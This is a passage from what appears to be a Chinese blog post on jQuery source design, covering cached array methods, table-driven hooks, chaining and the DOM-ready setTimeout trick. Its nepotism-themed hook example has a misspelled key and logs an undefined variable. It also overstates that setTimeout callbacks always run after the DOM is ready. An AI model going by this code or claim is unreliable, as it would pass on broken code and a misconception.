Array.prototype.slice.call(this) return core_slice.call(this); &#125;&#125; 可以看到，当需要使用这些预先定义好的方法，只需要借助 call 或者 apply（ 戳我详解 ）进行调用。那么 jQuery 为什么要这样做呢，我觉得： 1、以数组对象的 concat 方法为例，如果不预先定义好 core_concat = core_deletedIds.concat 而是调用实例 arr 的方法 concat 时，首先需要辨别当前实例 arr 的类型是 Array，在内存空间中寻找 Array 的 concat 内存入口，把当前对象 arr 的指针和其他参数压入栈，跳转到 concat 地址开始执行，而当保存了 concat 方法的入口 core_concat 时，完全就可以省去前面两个步骤，从而提升一些性能； 2、另外一点，借助 call 或者 apply 的方式调用，让一些类数组可以直接调用数组的方法。就如上面是示例，jQuery 对象是类数组类型，可以直接调用数组的 slice 方法转换为数组类型。又譬如，将参数 arguments 转换为数组类型：1234567function test(a,b,c)&#123; // 将参数 arguments 转换为数组 // 使之可以调用数组成员方法 var arr = Array.prototype.slice.call(arguments); ...&#125; 钩子机制（hook）在 jQuery 2.0.0 之前的版本，对兼容性做了大量的处理，正是这样才让广大开发人员能够忽略不同浏览器的不同特性的专注于业务本身的逻辑。而其中，钩子机制在浏览器兼容方面起了十分巨大的作用。 钩子是编程惯用的一种手法，用来解决一种或多种特殊情况的处理。 简单来说，钩子就是适配器原理，或者说是表驱动原理，我们预先定义了一些钩子，在正常的代码逻辑中使用钩子去适配一些特殊的属性，样式或事件，这样可以让我们少写很多 else if 语句。 如果还是很难懂，看一个简单的例子，举例说明 hook 到底如何使用： 现在考公务员，要么靠实力，要么靠关系，但领导肯定也不会弄的那么明显，一般都是暗箱操作，这个场景用钩子实现再合理不过了。123456789101112131415161718192021222324252627282930313233343536373839404142// 如果不用钩子的情况// 考生分数以及父亲名function examinee(name, score, fatherName) &#123; return &#123; name: name, score: score, fatherName: fatherName &#125;;&#125;// 审阅考生们function judge(examinees) &#123; var result = &#123;&#125;; for (var i in examinees) &#123; var curExaminee = examinees[i]; var ret = curExaminee.score; // 判断是否有后门关系 if (curExaminee.fatherName === 'xijingping') &#123; ret += 1000; &#125; else if (curExaminee.fatherName === 'ligang') &#123; ret += 100; &#125; else if (curExaminee.fatherName === 'pengdehuai') &#123; ret += 50; &#125; result[curExaminee.name] = ret; &#125; return result;&#125;var lihao = examinee("lihao", 10, 'ligang');var xida = examinee('xida', 8, 'xijinping');var peng = examinee('peng', 60, 'pengdehuai');var liaoxiaofeng = examinee('liaoxiaofeng', 100, 'liaodaniu');var result = judge([lihao, xida, peng, liaoxiaofeng]);// 根据分数选取前三名for (var name in result) &#123; console.log("name:" + name); console.log("score:" + score);&#125; 可以看到，在中间审阅考生这个函数中，运用了很多 else if 来判断是否考生有后门关系，如果现在业务场景发生变化，又多了几名考生，那么 else if 势必越来越复杂，往后维护代码也将越来越麻烦，成本很大，那么这个时候如果使用钩子机制，该如何做呢？1234567891011121314151617181920212223242526272829303132333435363738394041424344// relationHook 是个钩子函数，用于得到关系得分var relationHook = &#123; "xijinping": 1000, "ligang": 100, "pengdehuai": 50, // 新的考生只需要在钩子里添加关系分&#125;// 考生分数以及父亲名function examinee(name, score, fatherName) &#123; return &#123; name: name, score: score, fatherName: fatherName &#125;;&#125;// 审阅考生们function judge(examinees) &#123; var result = &#123;&#125;; for (var i in examinees) &#123; var curExaminee = examinees[i]; var ret = curExaminee.score; if (relationHook[curExaminee.fatherName] ) &#123; ret += relationHook[curExaminee.fatherName] ; &#125; result[curExaminee.name] = ret; &#125; return result;&#125;var lihao = examinee("lihao", 10, 'ligang');var xida = examinee('xida', 8, 'xijinping');var peng = examinee('peng', 60, 'pengdehuai');var liaoxiaofeng = examinee('liaoxiaofeng', 100, 'liaodaniu');var result = judge([lihao, xida, peng, liaoxiaofeng]);// 根据分数选取前三名for (var name in result) &#123; console.log("name:" + name); console.log("score:" + score);&#125; 可以看到，使用钩子去处理特殊情况，可以让代码的逻辑更加清晰，省去大量的条件判断，上面的钩子机制的实现方式，采用的就是表驱动方式，就是我们事先预定好一张表（俗称打表），用这张表去适配特殊情况。当然 jQuery 的 hook 是一种更为抽象的概念，在不同场景可以用不同方式实现。 看看 jQuery 里的表驱动 hook 实现，$.type 方法：1234567891011121314151617181920212223242526272829(function(window, undefined) &#123; var // 用于预存储一张类型表用于 hook class2type = &#123;&#125;; // 原生的 typeof 方法并不能区分出一个变量它是 Array 、RegExp 等 object 类型，jQuery 为了扩展 typeof 的表达力，因此有了 $.type 方法 // 针对一些特殊的对象（例如 null，Array，RegExp）也进行精准的类型判断 // 运用了钩子机制，判断类型前，将常见类型打表，先存于一个 Hash 表 class2type 里边 jQuery.each("Boolean Number String Function Array Date RegExp Object Error".split(" "), function(i, name) &#123; class2type["[object " + name + "]"] = name.toLowerCase(); &#125;); jQuery.extend(&#123; // 确定JavaScript 对象的类型 // 这个方法的关键之处在于 class2type[core_toString.call(obj)] // 可以使得 typeof obj 为 "object" 类型的得到更进一步的精确判断 type: function(obj) &#123; if (obj == null) &#123; return String(obj); &#125; // 利用事先存好的 hash 表 class2type 作精准判断 // 这里因为 hook 的存在，省去了大量的 else if 判断 return typeof obj === "object" || typeof obj === "function" ? class2type[core_toString.call(obj)] || "object" : typeof obj; &#125; &#125;)&#125;)(window); 这里的 hook 只是 jQuery 大量使用钩子的冰山一角，在对 DOM 元素的操作一块，`attr 、val 、prop 、css 方法大量运用了钩子，用于兼容 IE 系列下的一些怪异行为。在遇到钩子函数的时候，要结合具体情境具体分析，这些钩子相对于表驱动而言更加复杂，它们的结构大体如下，只要记住钩子的核心原则，保持代码整体逻辑的流畅性，在特殊的情境下去处理一些特殊的情况：123456789var someHook = &#123; get: function(elem) &#123; // obtain and return a value return "something"; &#125;, set: function(elem, value) &#123; // do something with value &#125;&#125; 从某种程度上讲，钩子是一系列被设计为以你自己的代码来处理自定义值的回调函数。有了钩子，你可以将差不多任何东西保持在可控范围内。 从设计模式的角度而言，这种钩子运用了策略模式。 策略模式：将不变的部分和变化的部分隔开是每个设计模式的主题，而策略模式则是将算法的使用与算法的实现分离开来的典型代表。使用策略模式重构代码，可以消除程序中大片的条件分支语句。在实际开发中，我们通常会把算法的含义扩散开来，使策略模式也可以用来封装一系列的“业务规则”。只要这些业务规则指向的目标一致，并且可以被替换使用，我们就可以使用策略模式来封装他们。 策略模式的优点： 策略模式利用组合，委托和多态等技术思想，可以有效的避免多重条件选择语句； 策略模式提供了对开放-封闭原则的完美支持，将算法封装在独立的函数中，使得它们易于切换，易于理解，易于扩展。 策略模式中的算法也可以复用在系统的其它地方，从而避免许多重复的复制粘贴工作。 连贯接口无论 jQuery 如今的流行趋势是否在下降，它用起来确实让人大呼过瘾，这很大程度归功于它的链式调用，接口的连贯性及易记性。很多人将连贯接口看成链式调用，这并不全面，我觉得连贯接口包含了链式调用且代表更多。而 jQuery 无疑是连贯接口的佼佼者。 1、链式调用：链式调用的主要思想就是使代码尽可能流畅易读，从而可以更快地被理解。有了链式调用，我们可以将代码组织为类似语句的片段，增强可读性的同时减少干扰。123456789101112131415// 传统写法var elem = document.getElementById("foobar");elem.style.background = "red";elem.style.color = "green";elem.addEventListener('click', function(event) &#123; alert("hello world!");&#125;, true);// jQuery 写法$('xxx') .css("background", "red") .css("color", "green") .on("click", function(event) &#123; alert("hello world"); &#125;); 2、命令查询同体：这个上一章也讲过了，就是函数重载。正常而言，应该是命令查询分离（Command and Query Separation，CQS），是源于命令式编程的一个概念。那些改变对象的状态（内部的值）的函数称为命令，而那些检索值的函数称为查询。原则上，查询函数返回数据，命令函数返回状态，各司其职。而 jQuery 将 getter 和 setter 方法压缩到单一方法中创建了一个连贯的接口，使得代码暴露更少的方法，但却以更少的代码实现同样的目标。 3、参数映射及处理：jQuery 的接口连贯性还体现在了对参数的兼容处理上，方法如何接收数据比让它们具有可链性更为重要。虽然方法的链式调用是非常普遍的，你可以很容易地在你的代码中实现，但是处理参数却不同，使用者可能传入各种奇怪的参数类型，而 jQuery 作者想的真的很周到，考虑了用户的多种使用场景，提供了多种对参数的处理。1234567891011121314// 传入键值对jQuery("#some-selector") .css("background", "red") .css("color", "white") .css("font-weight", "bold") .css("padding", 10);// 传入 JSON 对象jQuery("#some-selector").css(&#123; "background" : "red", "color" : "white", "font-weight" : "bold", "padding" : 10&#125;); jQuery 的 on()` 方法可以注册事件处理器。和 CSS() 一样它也可以接收一组映射格式的事件，但更进一步地，它允许单一处理器可以被多个事件注册：123456789// binding events by passing a mapjQuery("#some-selector").on(&#123; "click" : myClickHandler, "keyup" : myKeyupHandler, "change" : myChangeHandler&#125;);// binding a handler to multiple events:jQuery("#some-selector").on("click keyup change", myEventHandler); setTimeout in Jquery写到这里，发现上文的主题有些飘忽，接近于写成了 如何写出更好的 Javascript 代码，下面介绍一些 jQuery 中我觉得很棒的小技巧。 熟悉 jQuery 的人都知道 DOM Ready 事件，传Javascript原生的 window.onload 事件是在页面所有的资源都加载完毕后触发的。如果页面上有大图片等资源响应缓慢, 会导致 window.onload 事件迟迟无法触发，所以出现了DOM Ready 事件。此事件在 DOM 文档结构准备完毕后触发，即在资源加载前触发。另外我们需要在 DOM 准备完毕后，再修改DOM结构，比如添加DOM元素等。而为了完美实现 DOM Ready 事件，兼容各浏览器及低版本IE（针对高级的浏览器，可以使用 DOMContentLoaded 事件，省时省力），在 jQuery.ready() 方法里，运用了 setTimeout() 方法的一个特性， 在 setTimeout 中触发的函数, 一定是在 DOM 准备完毕后触发。123456789101112131415161718192021222324252627282930313233343536373839404142434445jQuery.extend(&#123; ready: function(wait) &#123; // 如果需要等待，holdReady()的时候，把hold住的次数减1，如果还没到达0，说明还需要继续hold住，return掉 // 如果不需要等待，判断是否已经Ready过了，如果已经ready过了，就不需要处理了。异步队列里边的done的回调都会执行了 if (wait === true ? --jQuery.readyWait : jQuery.isReady) &#123; return; &#125; // 确定 body 存在 if (!document.body) &#123; // 如果 body 还不存在 ，DOMContentLoaded 未完成，此时 // 将 jQuery.ready 放入定时器 setTimeout 中 // 不带时间参数的 setTimeout(a) 相当于 setTimeout(a,0) // 但是这里并不是立即触发 jQuery.ready // 由于 javascript 的单线程的异步模式 // setTimeout(jQuery.ready) 会等到重绘完成才执行代码，也就是 DOMContentLoaded 之后才执行 jQuery.ready // 所以这里有个小技巧：在 setTimeout 中触发的函数, 一定会在 DOM 准备完毕后触发 return setTimeout(jQuery.ready); &#125; // Remember that the DOM is ready // 记录 DOM ready 已经完成 jQuery.isReady = true; // If a normal DOM Ready event fired, decrement, and wait if need be // wait 为 false 表示ready事情未触发过，否则 return if (wait !== true &amp;&amp; --jQuery.readyWait &gt; 0) &#123; return; &#125; // If there are functions bound, to execute // 调用异步队列，然后派发成功事件出去（最后使用done接收，把上下文切换成document，默认第一个参数是jQuery。 readyList.resolveWith(document, [jQuery]); // Trigger any bound ready events // 最后jQuery还可以触发自己的ready事件 // 例如： // $(document).on('ready', fn2); // $(document).ready(fn1); // 这里的fn1会先执行，自己的ready事件绑定的fn2回调后执行 if (jQuery.fn.trigger) &#123; jQuery(document).trigger("ready").off("ready"); &#125; &#125;&#125;)]]></content>
      <categories>
        <category>jQuery</category>
      </categories>
      <tags>
        <tag>源码</tag>
        <tag>jQuery</tag>
      </tags>
  </entry>
</search>
